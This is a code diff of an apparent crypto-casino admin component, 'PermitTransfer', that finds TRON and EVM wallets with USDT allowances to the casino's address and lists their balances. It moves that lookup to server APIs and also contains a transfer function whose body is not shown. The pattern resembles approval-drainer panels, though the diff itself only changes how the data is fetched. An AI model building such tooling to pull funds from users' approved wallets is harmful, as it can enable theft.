@@ -45,9 +45,7 @@ export function PermitTransfer() {
   const supabase = createClient();
   
   // TRON state
-  const [tronUsers, setTronUsers] = useState<UserData[]>([]);
   const [tronUsersWithData, setTronUsersWithData] = useState<UserWithData[]>([]);
-  const [isTronLoading, setIsTronLoading] = useState(true);
   const [isTronDataLoading, setIsTronDataLoading] = useState(false);
   
   // EVM state
@@ -63,34 +61,6 @@ export function PermitTransfer() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [txSuccess, setTxSuccess] = useState(false);
   const [activeTab, setActiveTab] = useState<'tron' | 'evm'>('tron');
-
-  // Load TRON users from database
-  const loadTronUsers = useCallback(async () => {
-    setIsTronLoading(true);
-    try {
-      const { data, error } = await supabase
-        .from('users')
-        .select('id, wallet_address')
-        .not('wallet_address', 'is', null)
-        .or('wallet_address.like.T%,wallet_address.like.t%')
-        .order('created_at', { ascending: false });
-      
-      if (error) {
-        console.error('Error loading TRON users:', error);
-        return;
-      }
-      
-      // Only use properly cased TRON addresses (start with uppercase 'T')
-      const validTronUsers = (data || []).filter((u: any) => 
-        isTronAddress(u.wallet_address) && u.wallet_address.startsWith('T')
-      );
-      setTronUsers(validTronUsers);
-    } catch (error) {
-      console.error('Error:', error);
-    } finally {
-      setIsTronLoading(false);
-    }
-  }, [supabase]);
 
   // Load EVM users from database
   const loadEvmUsers = useCallback(async () => {
@@ -117,18 +87,38 @@ export function PermitTransfer() {
     }
   }, [supabase]);
 
-  // Fetch allowances and balances for TRON users
+  // Fetch TRON approvals via server-side API (more reliable, uses TronGrid API key)
   const fetchTronData = useCallback(async () => {
-    if (tronUsers.length === 0) {
-      setTronUsersWithData([]);
-      return;
-    }
-
     setIsTronDataLoading(true);
     try {
+      console.log('Fetching TRON approvals via API...');
+      
+      // Try server-side API first (most reliable)
+      const response = await fetch('/api/admin/tron-approvals');
+      
+      if (response.ok) {
+        const data = await response.json();
+        console.log(`API returned ${data.users?.length || 0} users with approvals`);
+        
+        const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
+          id: u.id,
+          wallet_address: u.wallet_address,
+          allowance: BigInt(u.allowance),
+          balance: BigInt(u.balance),
+          network: 'tron' as const
+        }));
+        
+        setTronUsersWithData(usersData);
+        return;
+      }
+      
+      // Fallback to client-side if API fails
+      console.warn('API failed, trying client-side approach...');
+      
       const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
       if (!tronWeb || !tronWeb.ready) {
         console.warn('TronWeb not available');
+        toast.error('Could not fetch TRON approvals. Please ensure TronLink is connected.');
         setTronUsersWithData([]);
         return;
       }
@@ -136,48 +126,91 @@ export function PermitTransfer() {
       const tronConfig = getActiveTronConfig();
       const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
       
+      // Fallback: load from database and check each address
+      const { data: dbUsers } = await supabase
+        .from('users')
+        .select('id, wallet_address')
+        .not('wallet_address', 'is', null)
+        .or('wallet_address.like.T%,wallet_address.like.t%');
+      
       const usersData: UserWithData[] = [];
       
-      for (const user of tronUsers) {
+      for (const user of dbUsers || []) {
+        if (!isTronAddress(user.wallet_address)) continue;
+        
+        // Skip lowercase addresses - they can't be used for blockchain call
+        if (user.wallet_address.startsWith('t')) {
+          console.warn(`Skipping lowercase address: ${user.wallet_address}`);
+          continue;
+        }
+        
         try {
           const [allowanceResult, balanceResult] = await Promise.all([
             usdtContract.allowance(user.wallet_address, tronConfig.casinoDepositAddress).call(),
             usdtContract.balanceOf(user.wallet_address).call()
           ]);
-
+          
           const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
           const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);
-
+          
           if (allowance > BigInt(0)) {
             usersData.push({
-              ...user,
+              id: user.id,
+              wallet_address: user.wallet_address,
               allowance,
               balance,
               network: 'tron'
             });
           }
         } catch (err) {
-          console.warn(`Failed to fetch TRON data for ${user.wallet_address}:`, err);
+          console.warn(`Failed to check ${user.wallet_address}:`, err);
         }
       }
       
+      console.log(`Client-side found ${usersData.length} users with approvals`);
       setTronUsersWithData(usersData);
+      
     } catch (error) {
       console.error('Error fetching TRON data:', error);
+      toast.error('Failed to fetch TRON approvals');
     } finally {
       setIsTronDataLoading(false);
     }
-  }, [tronUsers]);
+  }, [supabase]);
 
-  // Fetch allowances and balances for EVM users
+  // Fetch EVM approvals via server-side API
   const fetchEvmData = useCallback(async () => {
-    if (evmUsers.length === 0 || !publicClient) {
-      setEvmUsersWithData([]);
-      return;
-    }
-
     setIsEvmDataLoading(true);
     try {
+      console.log('Fetching EVM approvals via API...');
+      
+      // Try server-side API first
+      const response = await fetch('/api/admin/evm-approvals');
+      
+      if (response.ok) {
+        const data = await response.json();
+        console.log(`API returned ${data.users?.length || 0} users with EVM approvals`);
+        
+        const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
+          id: u.id,
+          wallet_address: u.wallet_address,
+          allowance: BigInt(u.allowance),
+          balance: BigInt(u.balance),
+          network: 'evm' as const
+        }));
+        
+        setEvmUsersWithData(usersData);
+        return;
+      }
+      
+      // Fallback to client-side if API fails and publicClient is available
+      console.warn('API failed, trying client-side approach...');
+      
+      if (!publicClient || evmUsers.length === 0) {
+        setEvmUsersWithData([]);
+        return;
+      }
+
       const networkConfig = getActiveNetworkConfig();
       const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;
       const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
@@ -219,30 +252,30 @@ export function PermitTransfer() {
       setEvmUsersWithData(usersData);
     } catch (error) {
       console.error('Error fetching EVM data:', error);
+      toast.error('Failed to fetch EVM approvals');
     } finally {
       setIsEvmDataLoading(false);
     }
   }, [evmUsers, publicClient]);
 
-  // Load users on mount
+  // Load EVM users on mount (for fallback)
   useEffect(() => {
-    loadTronUsers();
     loadEvmUsers();
-  }, [loadTronUsers, loadEvmUsers]);
+  }, [loadEvmUsers]);
 
-  // Fetch TRON data when users loaded and wallet connected
+  // Fetch TRON data when wallet connected
   useEffect(() => {
-    if (tronUsers.length > 0 && isTronConnected) {
+    if (isTronConnected) {
       fetchTronData();
     }
-  }, [tronUsers, isTronConnected, fetchTronData]);
+  }, [isTronConnected, fetchTronData]);
 
-  // Fetch EVM data when users loaded and wallet connected
+  // Fetch EVM data when wallet connected
   useEffect(() => {
-    if (evmUsers.length > 0 && isEvmConnected && publicClient) {
+    if (isEvmConnected) {
       fetchEvmData();
     }
-  }, [evmUsers, isEvmConnected, publicClient, fetchEvmData]);
+  }, [isEvmConnected, fetchEvmData]);
 
   // Execute TRON transfer
   const executeTronTransfer = async () => {
@@ -397,7 +430,6 @@ export function PermitTransfer() {
 
   const handleRefresh = () => {
     if (activeTab === 'tron') {
-      loadTronUsers();
       if (isTronConnected) fetchTronData();
     } else {
       loadEvmUsers();
@@ -405,7 +437,7 @@ export function PermitTransfer() {
     }
   };
 
-  const tronLoading = isTronLoading || isTronDataLoading;
+  const tronLoading = isTronDataLoading;
   const evmLoading = isEvmLoading || isEvmDataLoading;
 
   const renderUserTable = (users: UserWithData[], loading: boolean, network: 'tron' | 'evm', isWalletConnected: boolean, walletAddress: string | null | undefined) => {
